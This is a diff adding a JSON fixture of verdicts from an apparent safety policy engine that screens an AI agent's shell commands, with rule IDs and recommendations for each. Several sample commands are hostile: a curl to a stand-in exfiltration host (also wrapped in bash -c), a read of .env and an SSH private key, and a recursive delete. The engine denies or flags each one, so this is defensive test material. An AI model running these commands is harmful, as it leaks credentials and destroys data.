@@ -1,0 +1,610 @@
+[
+  {
+    "schema_version": "1",
+    "request_id": "ask_review",
+    "tool_name": "execute_code",
+    "backend": "codeexec",
+    "command": "go install example.com/unreviewed/tool@latest",
+    "decision": "ask",
+    "risk_level": "medium",
+    "blocked": true,
+    "duration_ms": 0.063,
+    "rule_ids": [
+      "TSG-HUMAN-REVIEW",
+      "TSG-DEPENDENCY-INSTALL"
+    ],
+    "findings": [
+      {
+        "rule_id": "TSG-HUMAN-REVIEW",
+        "category": "shell_bypass",
+        "risk_level": "medium",
+        "action": "ask",
+        "evidence": "code execution contains shell language block",
+        "location": "script.language",
+        "recommendation": "Review shell code before execution or use a more constrained language.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-DEPENDENCY-INSTALL",
+        "category": "dependency",
+        "risk_level": "medium",
+        "action": "ask",
+        "evidence": "dependency or environment change command: go install example.com/unreviewed/tool@latest",
+        "location": "segment[0]",
+        "recommendation": "Review package source, pin versions, and prefer approved mirrors before installing.",
+        "redacted": false
+      }
+    ],
+    "recommendation": "Review package source, pin versions, and prefer approved mirrors before installing.",
+    "redacted": false,
+    "telemetry_attributes": {
+      "tool.safety.backend": "codeexec",
+      "tool.safety.blocked": true,
+      "tool.safety.decision": "ask",
+      "tool.safety.redacted": false,
+      "tool.safety.risk_level": "medium",
+      "tool.safety.rule_id": "TSG-HUMAN-REVIEW"
+    }
+  },
+  {
+    "schema_version": "1",
+    "request_id": "dangerous_delete",
+    "tool_name": "workspace_exec",
+    "backend": "workspaceexec",
+    "command": "rm -rf /tmp/project",
+    "decision": "deny",
+    "risk_level": "critical",
+    "blocked": true,
+    "duration_ms": 0.021,
+    "rule_ids": [
+      "TSG-DANGER-RM-RF",
+      "TSG-HUMAN-REVIEW",
+      "TSG-DANGER-RM-RF"
+    ],
+    "findings": [
+      {
+        "rule_id": "TSG-DANGER-RM-RF",
+        "category": "dangerous_command",
+        "risk_level": "high",
+        "action": "deny",
+        "evidence": "denied command: rm",
+        "location": "segment[0]",
+        "recommendation": "Use an allowed, auditable command or request human approval.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-HUMAN-REVIEW",
+        "category": "policy",
+        "risk_level": "medium",
+        "action": "ask",
+        "evidence": "command is not in allowed_commands: rm",
+        "location": "segment[0]",
+        "recommendation": "Add the command to policy only after reviewing its safety boundary.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-DANGER-RM-RF",
+        "category": "dangerous_command",
+        "risk_level": "critical",
+        "action": "deny",
+        "evidence": "recursive delete command: rm -rf /tmp/project",
+        "location": "segment[0]",
+        "recommendation": "Do not run recursive deletion through tools; delete reviewed workspace-relative paths manually.",
+        "redacted": false
+      }
+    ],
+    "recommendation": "Do not run recursive deletion through tools; delete reviewed workspace-relative paths manually.",
+    "redacted": false,
+    "telemetry_attributes": {
+      "tool.safety.backend": "workspaceexec",
+      "tool.safety.blocked": true,
+      "tool.safety.decision": "deny",
+      "tool.safety.redacted": false,
+      "tool.safety.risk_level": "critical",
+      "tool.safety.rule_id": "TSG-DANGER-RM-RF"
+    }
+  },
+  {
+    "schema_version": "1",
+    "request_id": "dependency_install",
+    "tool_name": "workspace_exec",
+    "backend": "workspaceexec",
+    "command": "npm install left-pad",
+    "decision": "ask",
+    "risk_level": "medium",
+    "blocked": true,
+    "duration_ms": 0.013,
+    "rule_ids": [
+      "TSG-DEPENDENCY-INSTALL"
+    ],
+    "findings": [
+      {
+        "rule_id": "TSG-DEPENDENCY-INSTALL",
+        "category": "dependency",
+        "risk_level": "medium",
+        "action": "ask",
+        "evidence": "dependency or environment change command: npm install left-pad",
+        "location": "segment[0]",
+        "recommendation": "Review package source, pin versions, and prefer approved mirrors before installing.",
+        "redacted": false
+      }
+    ],
+    "recommendation": "Review package source, pin versions, and prefer approved mirrors before installing.",
+    "redacted": false,
+    "telemetry_attributes": {
+      "tool.safety.backend": "workspaceexec",
+      "tool.safety.blocked": true,
+      "tool.safety.decision": "ask",
+      "tool.safety.redacted": false,
+      "tool.safety.risk_level": "medium",
+      "tool.safety.rule_id": "TSG-DEPENDENCY-INSTALL"
+    }
+  },
+  {
+    "schema_version": "1",
+    "request_id": "host_pty",
+    "tool_name": "exec_command",
+    "backend": "hostexec",
+    "command": "sudo tail -f /var/log/system.log",
+    "decision": "deny",
+    "risk_level": "critical",
+    "blocked": true,
+    "duration_ms": 0.027,
+    "rule_ids": [
+      "TSG-HOSTEXEC-PRIVILEGE",
+      "TSG-HUMAN-REVIEW",
+      "TSG-HOSTEXEC-PRIVILEGE",
+      "TSG-DANGER-FORBIDDEN-PATH",
+      "TSG-RESOURCE-TIMEOUT",
+      "TSG-HOSTEXEC-PTY",
+      "TSG-HOSTEXEC-BACKGROUND"
+    ],
+    "findings": [
+      {
+        "rule_id": "TSG-HOSTEXEC-PRIVILEGE",
+        "category": "hostexec",
+        "risk_level": "high",
+        "action": "deny",
+        "evidence": "denied command: sudo",
+        "location": "segment[0]",
+        "recommendation": "Use an allowed, auditable command or request human approval.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-HUMAN-REVIEW",
+        "category": "policy",
+        "risk_level": "medium",
+        "action": "ask",
+        "evidence": "command is not in allowed_commands: sudo",
+        "location": "segment[0]",
+        "recommendation": "Add the command to policy only after reviewing its safety boundary.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-HOSTEXEC-PRIVILEGE",
+        "category": "hostexec",
+        "risk_level": "critical",
+        "action": "deny",
+        "evidence": "privilege escalation command: sudo",
+        "location": "segment[0]",
+        "recommendation": "Do not run privileged commands from agent tools.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-DANGER-FORBIDDEN-PATH",
+        "category": "dangerous_command",
+        "risk_level": "critical",
+        "action": "deny",
+        "evidence": "forbidden path referenced: /var/log/system.log",
+        "location": "segment[0]",
+        "recommendation": "Do not access credentials, private keys, system paths, or workspace escape paths.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-RESOURCE-TIMEOUT",
+        "category": "resource",
+        "risk_level": "medium",
+        "action": "ask",
+        "evidence": "timeout 1800000ms exceeds policy max 300000ms",
+        "location": "timeout",
+        "recommendation": "Reduce timeout or require human review for long-running execution.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-HOSTEXEC-PTY",
+        "category": "hostexec",
+        "risk_level": "high",
+        "action": "ask",
+        "evidence": "hostexec requested PTY/TTY interactive session",
+        "location": "backend.tty",
+        "recommendation": "Host PTY sessions can persist and should require explicit approval.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-HOSTEXEC-BACKGROUND",
+        "category": "hostexec",
+        "risk_level": "high",
+        "action": "ask",
+        "evidence": "hostexec requested background session",
+        "location": "backend.background",
+        "recommendation": "Review process lifetime and cleanup before starting host background commands.",
+        "redacted": false
+      }
+    ],
+    "recommendation": "Review process lifetime and cleanup before starting host background commands.",
+    "redacted": false,
+    "telemetry_attributes": {
+      "tool.safety.backend": "hostexec",
+      "tool.safety.blocked": true,
+      "tool.safety.decision": "deny",
+      "tool.safety.redacted": false,
+      "tool.safety.risk_level": "critical",
+      "tool.safety.rule_id": "TSG-HOSTEXEC-PRIVILEGE"
+    }
+  },
+  {
+    "schema_version": "1",
+    "request_id": "large_output",
+    "tool_name": "workspace_exec",
+    "backend": "workspaceexec",
+    "command": "yes output",
+    "decision": "deny",
+    "risk_level": "high",
+    "blocked": true,
+    "duration_ms": 0.014,
+    "rule_ids": [
+      "TSG-RESOURCE-LONG-RUNNING",
+      "TSG-RESOURCE-OUTPUT"
+    ],
+    "findings": [
+      {
+        "rule_id": "TSG-RESOURCE-LONG-RUNNING",
+        "category": "resource",
+        "risk_level": "high",
+        "action": "deny",
+        "evidence": "infinite-loop or unbounded output pattern detected",
+        "location": "segment[0]",
+        "recommendation": "Bound loops and output before execution.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-RESOURCE-OUTPUT",
+        "category": "resource",
+        "risk_level": "medium",
+        "action": "ask",
+        "evidence": "max output 1073741824 bytes exceeds policy max 4194304 bytes",
+        "location": "max_output_bytes",
+        "recommendation": "Reduce output cap or stream through reviewed artifact handling.",
+        "redacted": false
+      }
+    ],
+    "recommendation": "Reduce output cap or stream through reviewed artifact handling.",
+    "redacted": false,
+    "telemetry_attributes": {
+      "tool.safety.backend": "workspaceexec",
+      "tool.safety.blocked": true,
+      "tool.safety.decision": "deny",
+      "tool.safety.redacted": false,
+      "tool.safety.risk_level": "high",
+      "tool.safety.rule_id": "TSG-RESOURCE-LONG-RUNNING"
+    }
+  },
+  {
+    "schema_version": "1",
+    "request_id": "long_running",
+    "tool_name": "workspace_exec",
+    "backend": "workspaceexec",
+    "command": "sleep 999",
+    "decision": "ask",
+    "risk_level": "medium",
+    "blocked": true,
+    "duration_ms": 0.012,
+    "rule_ids": [
+      "TSG-RESOURCE-LONG-RUNNING",
+      "TSG-RESOURCE-TIMEOUT"
+    ],
+    "findings": [
+      {
+        "rule_id": "TSG-RESOURCE-LONG-RUNNING",
+        "category": "resource",
+        "risk_level": "medium",
+        "action": "ask",
+        "evidence": "sleep duration 999s exceeds policy max 60s",
+        "location": "segment[0]",
+        "recommendation": "Reduce sleep duration or use an explicit background session with review.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-RESOURCE-TIMEOUT",
+        "category": "resource",
+        "risk_level": "medium",
+        "action": "ask",
+        "evidence": "timeout 900000ms exceeds policy max 300000ms",
+        "location": "timeout",
+        "recommendation": "Reduce timeout or require human review for long-running execution.",
+        "redacted": false
+      }
+    ],
+    "recommendation": "Reduce timeout or require human review for long-running execution.",
+    "redacted": false,
+    "telemetry_attributes": {
+      "tool.safety.backend": "workspaceexec",
+      "tool.safety.blocked": true,
+      "tool.safety.decision": "ask",
+      "tool.safety.redacted": false,
+      "tool.safety.risk_level": "medium",
+      "tool.safety.rule_id": "TSG-RESOURCE-LONG-RUNNING"
+    }
+  },
+  {
+    "schema_version": "1",
+    "request_id": "network_allowed",
+    "tool_name": "workspace_exec",
+    "backend": "workspaceexec",
+    "command": "curl https://proxy.example.test/archive.tar.gz",
+    "decision": "allow",
+    "risk_level": "none",
+    "blocked": false,
+    "duration_ms": 0.029,
+    "rule_ids": [
+      "TSG-NETWORK-DOMAIN-ALLOWED"
+    ],
+    "findings": [
+      {
+        "rule_id": "TSG-NETWORK-DOMAIN-ALLOWED",
+        "category": "network",
+        "risk_level": "low",
+        "action": "allow",
+        "evidence": "network domain is allowed by policy: proxy.example.test",
+        "location": "segment[0]",
+        "recommendation": "Proceed under the configured network whitelist.",
+        "redacted": false
+      }
+    ],
+    "recommendation": "Execution request passed safety policy.",
+    "redacted": false,
+    "telemetry_attributes": {
+      "tool.safety.backend": "workspaceexec",
+      "tool.safety.blocked": false,
+      "tool.safety.decision": "allow",
+      "tool.safety.redacted": false,
+      "tool.safety.risk_level": "none",
+      "tool.safety.rule_id": "TSG-NETWORK-DOMAIN-ALLOWED"
+    }
+  },
+  {
+    "schema_version": "1",
+    "request_id": "network_denied",
+    "tool_name": "workspace_exec",
+    "backend": "workspaceexec",
+    "command": "curl https://evil.example/collect",
+    "decision": "deny",
+    "risk_level": "high",
+    "blocked": true,
+    "duration_ms": 0.021,
+    "rule_ids": [
+      "TSG-NETWORK-DOMAIN-DENIED"
+    ],
+    "findings": [
+      {
+        "rule_id": "TSG-NETWORK-DOMAIN-DENIED",
+        "category": "network",
+        "risk_level": "high",
+        "action": "deny",
+        "evidence": "network domain is explicitly denied: evil.example",
+        "location": "segment[0]",
+        "recommendation": "Use an approved internal mirror or remove network access.",
+        "redacted": false
+      }
+    ],
+    "recommendation": "Use an approved internal mirror or remove network access.",
+    "redacted": false,
+    "telemetry_attributes": {
+      "tool.safety.backend": "workspaceexec",
+      "tool.safety.blocked": true,
+      "tool.safety.decision": "deny",
+      "tool.safety.redacted": false,
+      "tool.safety.risk_level": "high",
+      "tool.safety.rule_id": "TSG-NETWORK-DOMAIN-DENIED"
+    }
+  },
+  {
+    "schema_version": "1",
+    "request_id": "pipeline",
+    "tool_name": "workspace_exec",
+    "backend": "workspaceexec",
+    "command": "cat logs.txt | grep token",
+    "decision": "ask",
+    "risk_level": "medium",
+    "blocked": true,
+    "duration_ms": 0.017,
+    "rule_ids": [
+      "TSG-SHELL-BYPASS-CONSTRUCT"
+    ],
+    "findings": [
+      {
+        "rule_id": "TSG-SHELL-BYPASS-CONSTRUCT",
+        "category": "shell_bypass",
+        "risk_level": "medium",
+        "action": "ask",
+        "evidence": "pipeline operator requires review because it can hide data flow between commands",
+        "location": "command",
+        "recommendation": "Use a direct command or review the full pipeline before execution.",
+        "redacted": false
+      }
+    ],
+    "recommendation": "Use a direct command or review the full pipeline before execution.",
+    "redacted": false,
+    "telemetry_attributes": {
+      "tool.safety.backend": "workspaceexec",
+      "tool.safety.blocked": true,
+      "tool.safety.decision": "ask",
+      "tool.safety.redacted": false,
+      "tool.safety.risk_level": "medium",
+      "tool.safety.rule_id": "TSG-SHELL-BYPASS-CONSTRUCT"
+    }
+  },
+  {
+    "schema_version": "1",
+    "request_id": "read_secret",
+    "tool_name": "workspace_exec",
+    "backend": "workspaceexec",
+    "command": "cat .env ~/.ssh/id_rsa",
+    "decision": "deny",
+    "risk_level": "critical",
+    "blocked": true,
+    "duration_ms": 0.02,
+    "rule_ids": [
+      "TSG-DANGER-FORBIDDEN-PATH",
+      "TSG-DANGER-FORBIDDEN-PATH",
+      "TSG-POLICY-ENV-NOT-ALLOWED",
+      "TSG-SECRET-LEAK"
+    ],
+    "findings": [
+      {
+        "rule_id": "TSG-DANGER-FORBIDDEN-PATH",
+        "category": "dangerous_command",
+        "risk_level": "critical",
+        "action": "deny",
+        "evidence": "forbidden path referenced: .env",
+        "location": "segment[0]",
+        "recommendation": "Do not access credentials, private keys, system paths, or workspace escape paths.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-DANGER-FORBIDDEN-PATH",
+        "category": "dangerous_command",
+        "risk_level": "critical",
+        "action": "deny",
+        "evidence": "forbidden path referenced: ~/.ssh/id_rsa",
+        "location": "segment[0]",
+        "recommendation": "Do not access credentials, private keys, system paths, or workspace escape paths.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-POLICY-ENV-NOT-ALLOWED",
+        "category": "policy",
+        "risk_level": "medium",
+        "action": "ask",
+        "evidence": "environment variable is not allowlisted: OPENAI_API_KEY",
+        "location": "env.OPENAI_API_KEY",
+        "recommendation": "Remove the variable or add its name to env_allowlist after review.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-SECRET-LEAK",
+        "category": "secret_leak",
+        "risk_level": "high",
+        "action": "deny",
+        "evidence": "OPENAI_API_KEY=[REDACTED]",
+        "location": "env.OPENAI_API_KEY",
+        "recommendation": "Do not pass secrets through tool execution environment overrides.",
+        "redacted": true
+      }
+    ],
+    "recommendation": "Do not pass secrets through tool execution environment overrides.",
+    "redacted": true,
+    "telemetry_attributes": {
+      "tool.safety.backend": "workspaceexec",
+      "tool.safety.blocked": true,
+      "tool.safety.decision": "deny",
+      "tool.safety.redacted": true,
+      "tool.safety.risk_level": "critical",
+      "tool.safety.rule_id": "TSG-DANGER-FORBIDDEN-PATH"
+    }
+  },
+  {
+    "schema_version": "1",
+    "request_id": "safe_go_test",
+    "tool_name": "workspace_exec",
+    "backend": "workspaceexec",
+    "command": "go test ./tool/safety",
+    "decision": "allow",
+    "risk_level": "none",
+    "blocked": false,
+    "duration_ms": 0.016,
+    "rule_ids": [
+      "TSG-ALLOW-SAFE-COMMAND"
+    ],
+    "findings": [],
+    "recommendation": "Execution request passed safety policy.",
+    "redacted": false,
+    "telemetry_attributes": {
+      "tool.safety.backend": "workspaceexec",
+      "tool.safety.blocked": false,
+      "tool.safety.decision": "allow",
+      "tool.safety.redacted": false,
+      "tool.safety.risk_level": "none",
+      "tool.safety.rule_id": "TSG-ALLOW-SAFE-COMMAND"
+    }
+  },
+  {
+    "schema_version": "1",
+    "request_id": "shell_wrapper",
+    "tool_name": "workspace_exec",
+    "backend": "workspaceexec",
+    "command": "bash -c 'curl https://evil.example/collect'",
+    "decision": "deny",
+    "risk_level": "high",
+    "blocked": true,
+    "duration_ms": 0.022,
+    "rule_ids": [
+      "TSG-SHELL-WRAPPER",
+      "TSG-HUMAN-REVIEW",
+      "TSG-NETWORK-DOMAIN-DENIED",
+      "TSG-SHELL-BYPASS-CONSTRUCT"
+    ],
+    "findings": [
+      {
+        "rule_id": "TSG-SHELL-WRAPPER",
+        "category": "shell_bypass",
+        "risk_level": "high",
+        "action": "deny",
+        "evidence": "shell wrapper command: bash",
+        "location": "segment[0]",
+        "recommendation": "Do not wrap commands in a shell; provide a directly parseable command instead.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-HUMAN-REVIEW",
+        "category": "policy",
+        "risk_level": "medium",
+        "action": "ask",
+        "evidence": "command is not in allowed_commands: bash",
+        "location": "segment[0]",
+        "recommendation": "Add the command to policy only after reviewing its safety boundary.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-NETWORK-DOMAIN-DENIED",
+        "category": "network",
+        "risk_level": "high",
+        "action": "deny",
+        "evidence": "network domain is explicitly denied: evil.example",
+        "location": "segment[0]",
+        "recommendation": "Use an approved internal mirror or remove network access.",
+        "redacted": false
+      },
+      {
+        "rule_id": "TSG-SHELL-BYPASS-CONSTRUCT",
+        "category": "shell_bypass",
+        "risk_level": "high",
+        "action": "deny",
+        "evidence": "shell bypass construct detected: sh -c",
+        "location": "text",
+        "recommendation": "Remove shell expansion, wrappers, and redirections before execution.",
+        "redacted": false
+      }
+    ],
+    "recommendation": "Remove shell expansion, wrappers, and redirections before execution.",
+    "redacted": false,
+    "telemetry_attributes": {
+      "tool.safety.backend": "workspaceexec",
+      "tool.safety.blocked": true,
+      "tool.safety.decision": "deny",
+      "tool.safety.redacted": false,
+      "tool.safety.risk_level": "high",
+      "tool.safety.rule_id": "TSG-SHELL-WRAPPER"
+    }
+  }
+]
